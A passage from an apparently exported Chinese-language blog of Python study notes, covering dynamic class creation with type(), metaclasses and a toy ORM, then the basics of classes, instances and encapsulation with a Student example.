class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Hello(object):</span><br><span class="line">    def hello(self, name=&#x27;world&#x27;):</span><br><span class="line">        print(&#x27;Hello, %s.&#x27; % name)</span><br></pre></td></tr></table></figure><p>当 Python 解释器载入<code>hello</code>模块时，就会依次执行该模块的所有语句，执行结果就是动态创建出一个<code>Hello</code>的 class 对象，测试如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; from hello import Hello</span><br><span class="line">&gt;&gt;&gt; h = Hello()</span><br><span class="line">&gt;&gt;&gt; h.hello()</span><br><span class="line">Hello, world.</span><br><span class="line">&gt;&gt;&gt; print(type(Hello))</span><br><span class="line">&lt;class &#x27;type&#x27;&gt;</span><br><span class="line">&gt;&gt;&gt; print(type(h))</span><br><span class="line">&lt;class &#x27;hello.Hello&#x27;&gt;</span><br></pre></td></tr></table></figure><p><code>type()</code>函数可以查看一个类型或变量的类型，<code>Hello</code>是一个class，它的类型就是<code>type</code>，而<code>h</code>是一个实例，它的类型就是class <code>Hello</code>。</p><p>我们说class的定义是运行时动态创建的，而创建class的方法就是使用<code>type()</code>函数。</p><p><code>type()</code>函数既可以返回一个对象的类型，又可以创建出新的类型，比如，我们可以通过<code>type()</code>函数创建出<code>Hello</code>类，而无需通过<code>class Hello(object)...</code>的定义：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; def fn(self, name=&#x27;world&#x27;): # 先定义函数</span><br><span class="line">...     print(&#x27;Hello, %s.&#x27; % name)</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; Hello = type(&#x27;Hello&#x27;, (object,), dict(hello=fn)) # 创建Hello class</span><br><span class="line">&gt;&gt;&gt; h = Hello()</span><br><span class="line">&gt;&gt;&gt; h.hello()</span><br><span class="line">Hello, world.</span><br><span class="line">&gt;&gt;&gt; print(type(Hello))</span><br><span class="line">&lt;class &#x27;type&#x27;&gt;</span><br><span class="line">&gt;&gt;&gt; print(type(h))</span><br><span class="line">&lt;class &#x27;__main__.Hello&#x27;&gt;</span><br></pre></td></tr></table></figure><p>要创建一个class对象，<code>type()</code>函数依次传入3个参数：</p><ol><li>class的名称；</li><li>继承的父类集合，注意Python支持多重继承，如果只有一个父类，别忘了tuple的单元素写法；</li><li>class的方法名称与函数绑定，这里我们把函数<code>fn</code>绑定到方法名<code>hello</code>上。</li></ol><p>通过<code>type()</code>函数创建的类和直接写class是完全一样的，因为Python解释器遇到class定义时，仅仅是扫描一下class定义的语法，然后调用<code>type()</code>函数创建出class。</p><p>正常情况下，我们都用<code>class Xxx...</code>来定义类，但是，<code>type()</code>函数也允许我们动态创建出类来，也就是说，动态语言本身支持运行期动态创建类，这和静态语言有非常大的不同，要在静态语言运行期创建类，必须构造源代码字符串再调用编译器，或者借助一些工具生成字节码实现，本质上都是动态编译，会非常复杂。</p><h3 id="7-6-2-metaclass"><a href="#7-6-2-metaclass" class="headerlink" title="7.6.2 metaclass"></a>7.6.2 metaclass</h3><p>除了使用<code>type()</code>动态创建类以外，要控制类的创建行为，还可以使用metaclass。</p><p>metaclass，直译为元类，简单的解释就是：</p><p>当我们定义了类以后，就可以根据这个类创建出实例，所以：先定义类，然后创建实例。</p><p>但是如果我们想创建出类呢？那就必须根据metaclass创建出类，所以：先定义metaclass，然后创建类。</p><p>连接起来就是：先定义metaclass，就可以创建类，最后创建实例。</p><p>所以，metaclass允许你创建类或者修改类。换句话说，你可以把类看成是metaclass创建出来的“实例”。</p><p>metaclass是Python面向对象里最难理解，也是最难使用的魔术代码。正常情况下，你不会碰到需要使用metaclass的情况，所以，以下内容看不懂也没关系，因为基本上你不会用到。</p><p>我们先看一个简单的例子，这个metaclass可以给我们自定义的MyList增加一个<code>add</code>方法：</p><p>定义<code>ListMetaclass</code>，按照默认习惯，metaclass的类名总是以Metaclass结尾，以便清楚地表示这是一个metaclass：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># metaclass是类的模板，所以必须从`type`类型派生：</span><br><span class="line">class ListMetaclass(type):</span><br><span class="line">    def __new__(cls, name, bases, attrs):</span><br><span class="line">        attrs[&#x27;add&#x27;] = lambda self, value: self.append(value)</span><br><span class="line">        return type.__new__(cls, name, bases, attrs)</span><br></pre></td></tr></table></figure><p>有了ListMetaclass，我们在定义类的时候还要指示使用ListMetaclass来定制类，传入关键字参数<code>metaclass</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">class MyList(list, metaclass=ListMetaclass):</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure><p>当我们传入关键字参数<code>metaclass</code>时，魔术就生效了，它指示Python解释器在创建<code>MyList</code>时，要通过<code>ListMetaclass.__new__()</code>来创建，在此，我们可以修改类的定义，比如，加上新的方法，然后，返回修改后的定义。</p><p><code>__new__()</code>方法接收到的参数依次是：</p><ol><li>当前准备创建的类的对象；</li><li>类的名字；</li><li>类继承的父类集合；</li><li>类的方法集合。</li></ol><p>测试一下<code>MyList</code>是否可以调用<code>add()</code>方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; L = MyList()</span><br><span class="line">&gt;&gt;&gt; L.add(1)</span><br><span class="line">&gt;&gt; L</span><br><span class="line">[1]</span><br></pre></td></tr></table></figure><p>而普通的<code>list</code>没有<code>add()</code>方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; L2 = list()</span><br><span class="line">&gt;&gt;&gt; L2.add(1)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">AttributeError: &#x27;list&#x27; object has no attribute &#x27;add&#x27;</span><br></pre></td></tr></table></figure><p>动态修改有什么意义？直接在<code>MyList</code>定义中写上<code>add()</code>方法不是更简单吗？正常情况下，确实应该直接写，通过metaclass修改纯属变态。</p><p>但是，总会遇到需要通过metaclass修改类定义的。ORM就是一个典型的例子。</p><p>ORM全称“Object Relational Mapping”，即对象-关系映射，就是把关系数据库的一行映射为一个对象，也就是一个类对应一个表，这样，写代码更简单，不用直接操作SQL语句。</p><p>要编写一个ORM框架，所有的类都只能动态定义，因为只有使用者才能根据表的结构定义出对应的类来。</p><p>让我们来尝试编写一个ORM框架。</p><p>编写底层模块的第一步，就是先把调用接口写出来。比如，使用者如果使用这个ORM框架，想定义一个<code>User</code>类来操作对应的数据库表<code>User</code>，我们期待他写出这样的代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">class User(Model):</span><br><span class="line">    # 定义类的属性到列的映射：</span><br><span class="line">    id = IntegerField(&#x27;id&#x27;)</span><br><span class="line">    name = StringField(&#x27;username&#x27;)</span><br><span class="line">    email = StringField(&#x27;email&#x27;)</span><br><span class="line">    password = StringField(&#x27;password&#x27;)</span><br><span class="line"></span><br><span class="line"># 创建一个实例：</span><br><span class="line">u = User(id=12345, name=&#x27;Michael&#x27;, email=&#x27;test@orm.org&#x27;, password=&#x27;my-pwd&#x27;)</span><br><span class="line"># 保存到数据库：</span><br><span class="line">u.save()</span><br></pre></td></tr></table></figure><p>其中，父类<code>Model</code>和属性类型<code>StringField</code>、<code>IntegerField</code>是由ORM框架提供的，剩下的魔术方法比如<code>save()</code>全部由metaclass自动完成。虽然metaclass的编写会比较复杂，但ORM的使用者用起来却异常简单。</p><p>现在，我们就按上面的接口来实现该ORM。</p><p>首先来定义<code>Field</code>类，它负责保存数据库表的字段名和字段类型：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">class Field(object):</span><br><span class="line"></span><br><span class="line">    def __init__(self, name, column_type):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.column_type = column_type</span><br><span class="line"></span><br><span class="line">    def __str__(self):</span><br><span class="line">        return &#x27;&lt;%s:%s&gt;&#x27; % (self.__class__.__name__, self.name)</span><br></pre></td></tr></table></figure><p>在<code>Field</code>的基础上，进一步定义各种类型的<code>Field</code>，比如<code>StringField</code>，<code>IntegerField</code>等等：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">class StringField(Field):</span><br><span class="line"></span><br><span class="line">    def __init__(self, name):</span><br><span class="line">        super(StringField, self).__init__(name, &#x27;varchar(100)&#x27;)</span><br><span class="line"></span><br><span class="line">class IntegerField(Field):</span><br><span class="line"></span><br><span class="line">    def __init__(self, name):</span><br><span class="line">        super(IntegerField, self).__init__(name, &#x27;bigint&#x27;)</span><br></pre></td></tr></table></figure><p>下一步，就是编写最复杂的<code>ModelMetaclass</code>了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">class ModelMetaclass(type):</span><br><span class="line"></span><br><span class="line">    def __new__(cls, name, bases, attrs):</span><br><span class="line">        if name==&#x27;Model&#x27;:</span><br><span class="line">            return type.__new__(cls, name, bases, attrs)</span><br><span class="line">        print(&#x27;Found model: %s&#x27; % name)</span><br><span class="line">        mappings = dict()</span><br><span class="line">        for k, v in attrs.items():</span><br><span class="line">            if isinstance(v, Field):</span><br><span class="line">                print(&#x27;Found mapping: %s ==&gt; %s&#x27; % (k, v))</span><br><span class="line">                mappings[k] = v</span><br><span class="line">        for k in mappings.keys():</span><br><span class="line">            attrs.pop(k)</span><br><span class="line">        attrs[&#x27;__mappings__&#x27;] = mappings # 保存属性和列的映射关系</span><br><span class="line">        attrs[&#x27;__table__&#x27;] = name # 假设表名和类名一致</span><br><span class="line">        return type.__new__(cls, name, bases, attrs)</span><br></pre></td></tr></table></figure><p>以及基类<code>Model</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">class Model(dict, metaclass=ModelMetaclass):</span><br><span class="line"></span><br><span class="line">    def __init__(self, **kw):</span><br><span class="line">        super(Model, self).__init__(**kw)</span><br><span class="line"></span><br><span class="line">    def __getattr__(self, key):</span><br><span class="line">        try:</span><br><span class="line">            return self[key]</span><br><span class="line">        except KeyError:</span><br><span class="line">            raise AttributeError(r&quot;&#x27;Model&#x27; object has no attribute &#x27;%s&#x27;&quot; % key)</span><br><span class="line"></span><br><span class="line">    def __setattr__(self, key, value):</span><br><span class="line">        self[key] = value</span><br><span class="line"></span><br><span class="line">    def save(self):</span><br><span class="line">        fields = []</span><br><span class="line">        params = []</span><br><span class="line">        args = []</span><br><span class="line">        for k, v in self.__mappings__.items():</span><br><span class="line">            fields.append(v.name)</span><br><span class="line">            params.append(&#x27;?&#x27;)</span><br><span class="line">            args.append(getattr(self, k, None))</span><br><span class="line">        sql = &#x27;insert into %s (%s) values (%s)&#x27; % (self.__table__, &#x27;,&#x27;.join(fields), &#x27;,&#x27;.join(params))</span><br><span class="line">        print(&#x27;SQL: %s&#x27; % sql)</span><br><span class="line">        print(&#x27;ARGS: %s&#x27; % str(args))</span><br></pre></td></tr></table></figure><p>当用户定义一个<code>class User(Model)</code>时，Python解释器首先在当前类<code>User</code>的定义中查找<code>metaclass</code>，如果没有找到，就继续在父类<code>Model</code>中查找<code>metaclass</code>，找到了，就使用<code>Model</code>中定义的<code>metaclass</code>的<code>ModelMetaclass</code>来创建<code>User</code>类，也就是说，metaclass可以隐式地继承到子类，但子类自己却感觉不到。</p><p>在<code>ModelMetaclass</code>中，一共做了几件事情：</p><ol><li>排除掉对<code>Model</code>类的修改；</li><li>在当前类（比如<code>User</code>）中查找定义的类的所有属性，如果找到一个Field属性，就把它保存到一个<code>__mappings__</code>的dict中，同时从类属性中删除该Field属性，否则，容易造成运行时错误（实例的属性会遮盖类的同名属性）；</li><li>把表名保存到<code>__table__</code>中，这里简化为表名默认为类名。</li></ol><p>在<code>Model</code>类中，就可以定义各种操作数据库的方法，比如<code>save()</code>，<code>delete()</code>，<code>find()</code>，<code>update</code>等等。</p><p>我们实现了<code>save()</code>方法，把一个实例保存到数据库中。因为有表名，属性到字段的映射和属性值的集合，就可以构造出<code>INSERT</code>语句。</p><p>编写代码试试：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">u = User(id=12345, name=&#x27;Michael&#x27;, email=&#x27;test@orm.org&#x27;, password=&#x27;my-pwd&#x27;)</span><br><span class="line">u.save()</span><br></pre></td></tr></table></figure><p>输出如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Found model: User</span><br><span class="line">Found mapping: email ==&gt; &lt;StringField:email&gt;</span><br><span class="line">Found mapping: password ==&gt; &lt;StringField:password&gt;</span><br><span class="line">Found mapping: id ==&gt; &lt;IntegerField:uid&gt;</span><br><span class="line">Found mapping: name ==&gt; &lt;StringField:username&gt;</span><br><span class="line">SQL: insert into User (password,email,username,id) values (?,?,?,?)</span><br><span class="line">ARGS: [&#x27;my-pwd&#x27;, &#x27;test@orm.org&#x27;, &#x27;Michael&#x27;, 12345]</span><br></pre></td></tr></table></figure><p>可以看到，<code>save()</code>方法已经打印出了可执行的SQL语句，以及参数列表，只需要真正连接到数据库，执行该SQL语句，就可以完成真正的功能。</p><p>不到100行代码，我们就通过metaclass实现了一个精简的ORM框架，是不是非常简单？</p><p><img src="https://cos.gjcloak.xyz/images/01/20200817100532.png" alt="image-20200817100522200" title="image-20200817100522200"></p><blockquote><p>小结：</p></blockquote><p>metaclass是Python中非常具有魔术性的对象，它可以改变类创建时的行为。这种强大的功能使用起来务必小心。</p><h2 id="7-7-参考资料"><a href="#7-7-参考资料" class="headerlink" title="7.7 参考资料"></a>7.7 参考资料</h2><ul><li><a href="https://www.liaoxuefeng.com/wiki/1016959663602400/1017501628721248">廖雪峰 - Python 3.x - 面向对象高级编程</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 面向对象高级编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python学习笔记(六)·面向对象编程</title>
      <link href="/99.html"/>
      <url>/99.html</url>
      
        <content type="html"><![CDATA[<p>面向对象编程——Object Oriented Programming，简称 OOP，是一种程序设计思想。OOP 把对象作为程序的基本单元，一个对象包含了数据和操作数据的函数。</p><p>面向过程的程序设计把计算机程序视为一系列的命令集合，即一组函数的顺序执行。为了简化程序设计，面向过程把函数继续切分为子函数，即把大块函数通过切割成小块函数来降低系统的复杂度。</p><p>而面向对象的程序设计把计算机程序视为一组对象的集合，而每个对象都可以接收其他对象发过来的消息，并处理这些消息，计算机程序的执行就是一系列消息在各个对象之间传递。</p><p>在 Python 中，所有数据类型都可以视为对象，当然也可以自定义对象。自定义的对象数据类型就是面向对象中的类（Class）的概念。</p><p>我们以一个例子来说明面向过程和面向对象在程序流程上的不同之处。</p><p>假设我们要处理学生的成绩表，为了表示一个学生的成绩，面向过程的程序可以用一个 dict 表示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">std1 = &#123; &#x27;name&#x27;: &#x27;Michael&#x27;, &#x27;score&#x27;: 98 &#125;</span><br><span class="line">std2 = &#123; &#x27;name&#x27;: &#x27;Bob&#x27;, &#x27;score&#x27;: 81 &#125;</span><br></pre></td></tr></table></figure><p>而处理学生成绩可以通过函数实现，比如打印学生的成绩：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def print_score(std):</span><br><span class="line">    print(&#x27;%s: %s&#x27; % (std[&#x27;name&#x27;], std[&#x27;score&#x27;]))</span><br></pre></td></tr></table></figure><p>如果采用面向对象的程序设计思想，我们首选思考的不是程序的执行流程，而是<code>Student</code>这种数据类型应该被视为一个对象，这个对象拥有<code>name</code>和<code>score</code>这两个属性（Property）。如果要打印一个学生的成绩，首先必须创建出这个学生对应的对象，然后，给对象发一个<code>print_score</code>消息，让对象自己把自己的数据打印出来。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">class Student(object):</span><br><span class="line"></span><br><span class="line">    def __init__(self, name, score):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.score = score</span><br><span class="line"></span><br><span class="line">    def print_score(self):</span><br><span class="line">        print(&#x27;%s: %s&#x27; % (self.name, self.score))</span><br></pre></td></tr></table></figure><p>给对象发消息实际上就是调用对象对应的关联函数，我们称之为对象的方法（Method）。面向对象的程序写出来就像这样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bart = Student(&#x27;Bart Simpson&#x27;, 59)</span><br><span class="line">lisa = Student(&#x27;Lisa Simpson&#x27;, 87)</span><br><span class="line">bart.print_score()</span><br><span class="line">lisa.print_score()</span><br></pre></td></tr></table></figure><p>Class 是一种抽象概念，比如我们定义的 Class——Student，是指学生这个概念，而实例（Instance）则是一个个具体的 Student，比如，Bart Simpson 和 Lisa Simpson 是两个具体的 Student。</p><p>所以，面向对象的设计思想是抽象出 Class，根据 Class 创建 Instance。</p><blockquote><p>面向对象的抽象程度又比函数要高，因为一个Class既包含数据，又包含操作数据的方法。</p></blockquote><h2 id="6-1-类和实例"><a href="#6-1-类和实例" class="headerlink" title="6.1 类和实例"></a>6.1 类和实例</h2><p>面向对象最重要的概念就是类（Class）和实例（Instance），必须牢记类是抽象的模板，比如 Student 类，而实例是根据类创建出来的一个个具体的“对象”，每个对象都拥有相同的方法，但各自的数据可能不同。</p><p>仍以 Student 类为例，在 Python 中，定义类是通过<code>class</code>关键字：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">class Student(object):</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure><p><code>class</code>后面紧接着是类名，即<code>Student</code>，类名通常是大写开头的单词，紧接着是<code>(object)</code>，表示该类是从哪个类继承下来的，继承的概念我们后面再讲，通常，如果没有合适的继承类，就使用<code>object</code>类，这是所有类最终都会继承的类。</p><p>定义好了<code>Student</code>类，就可以根据<code>Student</code>类创建出<code>Student</code>的实例，创建实例是通过类名+()实现的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; bart = Student()</span><br><span class="line">&gt;&gt;&gt; bart</span><br><span class="line">&lt;__main__.Student object at 0x10a67a590&gt;</span><br><span class="line">&gt;&gt;&gt; Student</span><br><span class="line">&lt;class &#x27;__main__.Student&#x27;&gt;</span><br></pre></td></tr></table></figure><p>可以看到，变量<code>bart</code>指向的就是一个<code>Student</code>的实例，后面的<code>0x10a67a590</code>是内存地址，每个object的地址都不一样，而<code>Student</code>本身则是一个类。</p><p>可以自由地给一个实例变量绑定属性，比如，给实例<code>bart</code>绑定一个<code>name</code>属性：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; bart.name = &#x27;Bart Simpson&#x27;</span><br><span class="line">&gt;&gt;&gt; bart.name</span><br><span class="line">&#x27;Bart Simpson&#x27;</span><br></pre></td></tr></table></figure><p>由于类可以起到模板的作用，因此，可以在创建实例的时候，把一些我们认为必须绑定的属性强制填写进去。通过定义一个特殊的<code>__init__</code>方法，在创建实例的时候，就把<code>name</code>，<code>score</code>等属性绑上去：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">class Student(object):</span><br><span class="line">    def __init__(self, name, score):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.score = score</span><br></pre></td></tr></table></figure><p>!&gt; 注意：特殊方法“__init__”前后分别有两个下划线！！！</p><p>注意到<code>__init__</code>方法的第一个参数永远是<code>self</code>，表示创建的实例本身，因此，在<code>__init__</code>方法内部，就可以把各种属性绑定到<code>self</code>，因为<code>self</code>就指向创建的实例本身。</p><p>有了<code>__init__</code>方法，在创建实例的时候，就不能传入空的参数了，必须传入与<code>__init__</code>方法匹配的参数，但<code>self</code>不需要传，Python 解释器自己会把实例变量传进去：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; bart = Student(&#x27;Bart Simpson&#x27;, 59)</span><br><span class="line">&gt;&gt;&gt; bart.name</span><br><span class="line">&#x27;Bart Simpson&#x27;</span><br><span class="line">&gt;&gt;&gt; bart.score</span><br><span class="line">59</span><br></pre></td></tr></table></figure><p>和普通的函数相比，在类中定义的函数只有一点不同，就是第一个参数永远是实例变量<code>self</code>，并且，调用时，不用传递该参数。除此之外，类的方法和普通函数没有什么区别，所以，你仍然可以用默认参数、可变参数、关键字参数和命名关键字参数。</p><h3 id="6-1-1-数据封装"><a href="#6-1-1-数据封装" class="headerlink" title="6.1.1 数据封装"></a>6.1.1 数据封装</h3><p>面向对象编程的一个重要特点就是数据封装。在上面的<code>Student</code>类中，每个实例就拥有各自的<code>name</code>和<code>score</code>这些数据。我们可以通过函数来访问这些数据，比如打印一个学生的成绩：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">def print_score(std):</span><br><span class="line">    print(&#x27;%s: %s&#x27; % (std.name, std.score))</span><br><span class="line"></span><br><span class="line">print_score(bart)</span><br></pre></td></tr></table></figure><p>结果：</p><p><img src="https://cos.gjcloak.xyz/images01/20200722215133.png" alt="image-20200722215132081" title="image-20200722215132081"></p><p>但是，既然<code>Student</code>实例本身就拥有这些数据，要访问这些数据，就没有必要从外面的函数去访问，可以直接在<code>Student</code>类的内部定义访问数据的函数，这样，就把“数据”给封装起来了。这些封装数据的函数是和<code>Student</code>类本身是关联起来的，我们称之为类的方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">class Student(object):</span><br><span class="line"></span><br><span class="line">    def __init__(self, name, score):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.score = score</span><br><span class="line"></span><br><span class="line">    def print_score(self):</span><br><span class="line">        print(&#x27;%s: %s&#x27; % (self.name, self.score))</span><br></pre></td></tr></table></figure><p>要定义一个方法，除了第一个参数是<code>self</code>外，其他和普通函数一样。要调用一个方法，只需要在实例变量上直接调用，除了<code>self</code>不用传递，其他参数正常传入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bart = Student(&#x27;Bart Simpson&#x27;, 59)</span><br><span class="line">bart.print_score() # Bart Simpson: 59</span><br></pre></td></tr></table></figure><p>这样一来，我们从外部看<code>Student</code>类，就只需要知道，创建实例需要给出<code>name</code>和<code>score</code>，而如何打印，都是在<code>Student</code>类的内部定义的，这些数据和逻辑被“封装”起来了，调用很容易，但却不用知道内部实现的细节。</p><p>封装的另一个好处是可以给<code>Student</code>类增加新的方法，比如<code>get_grade</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">class Student(object):</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    def get_grade(self):</span><br><span class="line">        if self.score &gt;= 90:</span><br><span class="line">            return &#x27;A&#x27;</span><br><span class="line">        elif self.score &gt;= 60:</span><br><span class="line">            return &#x27;B&#x27;</span><br><span class="line">        else:</span><br><span class="line">            return &#x27;C&#x27;</span><br></pre></td></tr></table></figure><p>同样的，<code>get_grade</code>方法可以直接在实例变量上调用，不需要知道内部实现细节：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">class Student(object):</span><br><span class="line">    def __init__(self, name, score):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.score = score</span><br><span class="line"></span><br><span class="line">    def get_grade(self):</span><br><span class="line">        if self.score &gt;= 90:</span><br><span class="line">            return &#x27;A&#x27;</span><br><span class="line">        elif self.score &gt;= 60:</span><br><span class="line">            return &#x27;B&#x27;</span><br><span class="line">        else:</span><br><span class="line">            return &#x27;C&#x27;</span><br><span class="line">lisa = Student(&#x27;Lisa&#x27;, 99)</span><br><span class="line">bart = Student(&#x27;Bart&#x27;, 59)</span><br><span class="line">print(lisa.name, lisa.get_grade()) # Lisa A</span><br><span class="line">print(bart.name, bart.get_grade()) # Bart C</span><br></pre></td></tr></table></figure><blockquote><p>小结：</p></blockquote><p>类是创建实例的模板，而实例则是一个一个具体的对象，各个实例拥有的数据都互相独立，互不影响；</p><p>方法就是与实例绑定的函数，和普通函数不同，方法可以直接访问实例的数据；</p><p>通过在实例上调用方法，我们就直接操作了对象内部的数据，但无需知道方法内部的实现细节。</p><p>和静态语言不同，Python 允许对实例变量绑定任何数据，也就是说，对于两个实例变量，虽然它们都是同一个类的不同实例，但拥有的变量名称都可能不同：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; bart = Student(&#x27;Bart Simpson&#x27;, 59)</span><br><span class="line">&gt;&gt;&gt; lisa = Student(&#x27;Lisa Simpson&#x27;, 87)</span><br><span class="line">&gt;&gt;&gt; bart.age = 8</span><br><span class="line">&gt;&gt;&gt; bart.age</span><br><span class="line">8</span><br><span class="line">&gt;&gt;&gt; lisa.age</span><br><span class="line">Traceback (most recent call last):</span><br><span 